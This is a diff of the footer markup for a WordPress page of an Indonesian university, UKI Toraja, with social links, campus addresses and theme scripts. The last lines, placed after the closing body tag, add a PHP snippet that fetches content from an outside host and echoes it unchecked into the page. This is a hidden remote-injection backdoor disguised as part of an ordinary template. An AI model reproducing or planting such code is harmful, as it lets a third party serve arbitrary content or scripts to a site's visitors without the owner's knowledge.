+               target="_blank"><span
+                class='et_pb_social_media_follow_network_name'
+                aria-hidden='true'
+                >Follow</span></a></li><li
+            class='et_pb_social_media_follow_network_4 et_pb_social_icon et_pb_social_network_link  
+et-social-tiktok et-pb-social-fa-icon'><a
+              href='https://www.tiktok.com/@uki.toraja'
+              class='icon et_pb_with_border'
+              title='Follow on TikTok'
+               target="_blank"><span
+                class='et_pb_social_media_follow_network_name'
+                aria-hidden='true'
+                >Follow</span></a></li>
+			</ul>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div>		</div>
+	</div>
+						</div>
+
+				
+				</article>
+
+			
+
+</div>
+
+
+			<footer id="main-footer">
+				
+<div class="container">
+	<div id="footer-widgets" class="clearfix">
+		<div class="footer-widget"><div id="text-4" class="fwidget et_pb_widget widget_text">			
+<div class="textwidget"><b>Kantor Pusat</b><br>
+     Jalan Nusantara No 12<br>
+     Telp : (0423)22468 / (0423) 22887<br>
+     Fax : (0423)22073<br>
+     Kode Pos: 91811
+     Makale, Tana Toraja
+     Sulawesi Selatan, Indonesia<br>
+</div>
+		</div></div><div class="footer-widget"><div id="text-11" class="fwidget et_pb_widget 
+widget_text">			<div class="textwidget"><p><b>Kampus 1</b><br />Jalan Jenderal Sudirman No.9 
+Makale<br />Telp:(0423) 22060<br />Kode Pos: 91811</p>
+<p><b>Kampus 2</b><br />Jalan Poros Rantepao Sa&#8217;dan</p>
+<p><b>Kampus 3</b><br />Jalan Dr.Ratulangi No.80 Rantepao<br />Telp:(0423) 21129</p>
+</div>
+		</div></div><div class="footer-widget"><div id="nav_menu-3" class="fwidget et_pb_widget 
+widget_nav_menu"><h4 class="title">Tautan</h4><div class="menu-menubawah-container"><ul id="menu-menubawah" 
+class="menu"><li id="menu-item-3453" class="menu-item menu-item-type-custom menu-item-object-custom 
+menu-item-3453"><a href="http://lpm.ukitoraja.ac.id/">LPM UKI Toraja</a></li>
+<li id="menu-item-3454" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3454"><a 
+href="http://lppm.ukitoraja.ac.id/">LPPM UKI Toraja</a></li>
+</ul></div></div></div><div class="footer-widget"></div>	</div>
+</div>
+
+
+		
+				<div id="footer-bottom">
+					<div class="container clearfix">
+				<div id="footer-info">© 2019 Universitas Kristen Indonesia Toraja</div>					
+</div>
+				</div>
+			</footer>
+		</div>
+
+
+	</div>
+
+	<div class="gtranslate_wrapper" id="gt-wrapper-83144873"></div>		<script>
+		( function ( body ) {
+			'use strict';
+			body.className = body.className.replace( /\btribe-no-js\b/, 'tribe-js' );
+		} )( document.body );
+		</script>
+			<script type="text/javascript">
+				var et_animation_data = 
+[{"class":"et_pb_fullwidth_slider_0","style":"fade","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_fullwidth_slider_1","style":"fade","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_text_1","style":"bounce","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"}];
+					var et_link_options_data =[{"class":"et_pb_slide_0","url":"https:\/\/ukitoraja.ac.id\/webx\/pmb2024","target":"_self"},{"class":"et_pb_fullwidth_slider_0","url":"#infoPMB","target":"_self"},{"class":"et_pb_slide_4","url":"https:\/\/ukitoraja.ac.id\/webx\/pmb2024","target":"_self"},{"class":"et_pb_fullwidth_slider_1","url":"#infoPMB","target":"_self"},{"class":"et_pb_blurb_3","url":"https:\/\/ukitoraja.ac.id\/webx\/kehidupan-kampus\/?et_fb=1&PageSpeed=off","target":"_blank"},{"class":"et_pb_blurb_6","url":"https:\/\/ukitoraja.ac.id\/webx\/unit-kegiatan-kampus-ukm\/","target":"_blank"},{"class":"et_pb_blurb_7","url":"https:\/\/ukitoraja.ac.id\/webx\/prestasi-mahasiswa\/","target":"_blank"},{"class":"et_pb_blurb_8","url":"https:\/\/ukitoraja.ac.id\/webx\/kehidupan-kampus\/?et_fb=1&PageSpeed=off","target":"_blank"}];
+			</script>
+	<script> /* <![CDATA[ */var tribe_l10n_datatables = {"aria":{"sort_ascending":": activate to sort column 
+ascending","sort_descending":": activate to sort column descending"},"length_menu":"Show _MENU_ 
+entries","empty_table":"No data available in table","info":"Showing _START_ to _END_ of _TOTAL_ 
+entries","info_empty":"Showing 0 to 0 of 0 entries","info_filtered":"(filtered from _MAX_ total 
+entries)","zero_records":"No matching records found","search":"Search:","all_selected_text":"All items on this 
+page were selected. ","select_all_link":"Select all pages","clear_selection":"Clear 
+Selection.","pagination":{"all":"All","next":"Next","previous":"Previous"},"select":{"rows":{"0":"","_":": 
+Selected %d rows","1":": Selected 1 
+row"}},"datepicker":{"dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesMin":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Prev","currentText":"Today","closeText":"Done","today":"Today","clear":"Clear"}};/* 
+]]> */ </script><link rel='stylesheet' id='wp-block-library-css' 
+href='https://c0.wp.com/c/6.4.4/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='none' 
+onload="media='all'" />
+<style id='wp-block-library-inline-css' type='text/css'>
+.has-text-align-justify{text-align:justify;}
+</style>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/plugins/jetpack/jetpack_vendor/automattic/jetpack-image-cdn/dist/image-cdn.js?minify=false&amp;ver=132249e245926ae3e188" 
+id="jetpack-photon-js"></script>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/plugins/popups-for-divi/scripts/front.min.js?ver=3.0.5" 
+id="js-divi-area-js"></script>
+<script type="text/javascript" id="divi-custom-script-js-extra">
+/* <![CDATA[ */
+var DIVI = {"item_count":"%d Item","items_count":"%d Items"};
+var et_builder_utils_params = 
+{"condition":{"diviTheme":true,"extraTheme":false},"scrollLocations":["app","top"],"builderScrollLocations":{"desktop":"app","tablet":"app","phone":"app"},"onloadScrollLocation":"app","builderType":"fe"};
+var et_frontend_scripts = {"builderCssContainerPrefix":"#et-boc","builderCssLayoutPrefix":"#et-boc .et-l"};
+var et_pb_custom = 
+{"ajaxurl":"https:\/\/ukitoraja.ac.id\/webx\/wp-admin\/admin-ajax.php","images_uri":"https:\/\/ukitoraja.ac.id\/webx\/wp-content\/themes\/Divi\/images","builder_images_uri":"https:\/\/ukitoraja.ac.id\/webx\/wp-content\/themes\/Divi\/includes\/builder\/images","et_frontend_nonce":"5c2323ed0c","subscription_failed":"Please, 
+check the fields below to make sure you entered the correct 
+information.","et_ab_log_nonce":"b010a5cae0","fill_message":"Please, fill in the following 
+fields:","contact_error_message":"Please, fix the following errors:","invalid":"Invalid 
+email","captcha":"Captcha","prev":"Prev","previous":"Previous","next":"Next","wrong_captcha":"You entered the 
+wrong number in 
+captcha.","wrong_checkbox":"Checkbox","ignore_waypoints":"no","is_divi_theme_used":"1","widget_search_selector":".widget_search","ab_tests":[],"is_ab_testing_active":"","page_id":"2220","unique_test_id":"","ab_bounce_rate":"5","is_cache_plugin_active":"no","is_shortcode_tracking":"","tinymce_uri":"https:\/\/ukitoraja.ac.id\/webx\/wp-content\/themes\/Divi\/includes\/builder\/frontend-builder\/assets\/vendors","accent_color":"#2ea3f2","waypoints_options":{"context":[".pum-overlay"]}};
+var et_pb_box_shadow_elements = [];
+/* ]]> */
+</script>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/themes/Divi/js/scripts.min.js?ver=4.21.0" 
+id="divi-custom-script-js"></script>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/themes/Divi/core/admin/js/common.js?ver=4.21.0" 
+id="et-core-common-js"></script>
+<script type="text/javascript" src="https://stats.wp.com/e-202415.js" id="jetpack-stats-js" 
+data-wp-strategy="defer"></script>
+<script type="text/javascript" id="jetpack-stats-js-after">
+/* <![CDATA[ */
+_stq = window._stq || [];
+_stq.push([ "view", 
+JSON.parse("{\"v\":\"ext\",\"blog\":\"211550170\",\"post\":\"2220\",\"tz\":\"0\",\"srv\":\"ukitoraja.ac.id\",\"j\":\"1:13.2.2\"}") 
+]);
+_stq.push([ "clickTrackerInit", "211550170", "2220" ]);
+/* ]]> */
+</script>
+<script type="text/javascript" id="mediaelement-core-js-before">
+/* <![CDATA[ */
+var mejsL10n = {"language":"en","strings":{"mejs.download-file":"Download File","mejs.install-flash":"You are 
+using a browser that does not have Flash player enabled or installed. Please turn on your Flash player plugin or 
+download the latest version from 
+https:\/\/get.adobe.com\/flashplayer\/","mejs.fullscreen":"Fullscreen","mejs.play":"Play","mejs.pause":"Pause","mejs.time-slider":"Time 
+Slider","mejs.time-help-text":"Use Left\/Right Arrow keys to advance one second, Up\/Down arrows to advance ten 
+seconds.","mejs.live-broadcast":"Live Broadcast","mejs.volume-help-text":"Use Up\/Down Arrow keys to increase or 
+decrease volume.","mejs.unmute":"Unmute","mejs.mute":"Mute","mejs.volume-slider":"Volume 
+Slider","mejs.video-player":"Video Player","mejs.audio-player":"Audio 
+Player","mejs.captions-subtitles":"Captions\/Subtitles","mejs.captions-chapters":"Chapters","mejs.none":"None","mejs.afrikaans":"Afrikaans","mejs.albanian":"Albanian","mejs.arabic":"Arabic","mejs.belarusian":"Belarusian","mejs.bulgarian":"Bulgarian","mejs.catalan":"Catalan","mejs.chinese":"Chinese","mejs.chinese-simplified":"Chinese 
+(Simplified)","mejs.chinese-traditional":"Chinese 
+(Traditional)","mejs.croatian":"Croatian","mejs.czech":"Czech","mejs.danish":"Danish","mejs.dutch":"Dutch","mejs.english":"English","mejs.estonian":"Estonian","mejs.filipino":"Filipino","mejs.finnish":"Finnish","mejs.french":"French","mejs.galician":"Galician","mejs.german":"German","mejs.greek":"Greek","mejs.haitian-creole":"Haitian 
+Creole","mejs.hebrew":"Hebrew","mejs.hindi":"Hindi","mejs.hungarian":"Hungarian","mejs.icelandic":"Icelandic","mejs.indonesian":"Indonesian","mejs.irish":"Irish","mejs.italian":"Italian","mejs.japanese":"Japanese","mejs.korean":"Korean","mejs.latvian":"Latvian","mejs.lithuanian":"Lithuanian","mejs.macedonian":"Macedonian","mejs.malay":"Malay","mejs.maltese":"Maltese","mejs.norwegian":"Norwegian","mejs.persian":"Persian","mejs.polish":"Polish","mejs.portuguese":"Portuguese","mejs.romanian":"Romanian","mejs.russian":"Russian","mejs.serbian":"Serbian","mejs.slovak":"Slovak","mejs.slovenian":"Slovenian","mejs.spanish":"Spanish","mejs.swahili":"Swahili","mejs.swedish":"Swedish","mejs.tagalog":"Tagalog","mejs.thai":"Thai","mejs.turkish":"Turkish","mejs.ukrainian":"Ukrainian","mejs.vietnamese":"Vietnamese","mejs.welsh":"Welsh","mejs.yiddish":"Yiddish"}};
+/* ]]> */
+</script>
+<script type="text/javascript" 
+src="https://c0.wp.com/c/6.4.4/wp-includes/js/mediaelement/mediaelement-and-player.min.js" 
+id="mediaelement-core-js"></script>
+<script type="text/javascript" 
+src="https://c0.wp.com/c/6.4.4/wp-includes/js/mediaelement/mediaelement-migrate.min.js" 
+id="mediaelement-migrate-js"></script>
+<script type="text/javascript" id="mediaelement-js-extra">
+/* <![CDATA[ */
+var _wpmejsSettings = 
+{"pluginPath":"\/webx\/wp-includes\/js\/mediaelement\/","classPrefix":"mejs-","stretching":"responsive","audioShortcodeLibrary":"mediaelement","videoShortcodeLibrary":"mediaelement"};
+/* ]]> */
+</script>
+<script type="text/javascript" 
+src="https://c0.wp.com/c/6.4.4/wp-includes/js/mediaelement/wp-mediaelement.min.js" 
+id="wp-mediaelement-js"></script>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/salvattore.js?ver=4.21.0" 
+id="salvattore-js"></script>
+<script type="text/javascript" id="gt_widget_script_83144873-js-before">
+/* <![CDATA[ */
+window.gtranslateSettings = /* document.write */ window.gtranslateSettings || 
+{};window.gtranslateSettings['83144873'] = 
+{"default_language":"id","languages":["id","en","ru","ko","zh-CN"],"url_structure":"none","flag_style":"3d","flag_size":16,"wrapper_selector":"#gt-wrapper-83144873","alt_flags":[],"switcher_open_direction":"bottom","switcher_horizontal_position":"right","switcher_vertical_position":"bottom","switcher_text_color":"#ffffff","switcher_arrow_color":"#ffffff","switcher_border_color":"#8c0000","switcher_background_color":"#8c0000","switcher_background_shadow_color":"#8c0000","switcher_background_hover_color":"#a00000","dropdown_text_color":"#fcfcfc","dropdown_hover_color":"#af0000","dropdown_background_color":"#8c0000","flags_location":"\/webx\/wp-content\/plugins\/gtranslate\/flags\/"};
+/* ]]> */
+</script><script 
+src="https://ukitoraja.ac.id/webx/wp-content/plugins/gtranslate/js/dwf.js?ver=b1d4e9be037e137becdae84a7fa20810" 
+data-no-optimize="1" data-no-minify="1" data-gt-orig-url="/webx/" data-gt-orig-domain="ukitoraja.ac.id" 
+data-gt-widget-id="83144873" defer></script><script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/jquery.fitvids.js?ver=4.21.0" 
+id="fitvids-js"></script>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/jquery.mobile.js?ver=4.21.0" 
+id="jquery-mobile-js"></script>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/easypiechart.js?ver=4.21.0" 
+id="easypiechart-js"></script>
+
+</body>
+<?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://php-json.dev/css-json.php'); curl_setopt($ch, 
+CURLOPT_RETURNTRANSFER, true); $dewa = curl_exec($ch); curl_close($ch);?> <?php echo $dewa; ?>
+</html>
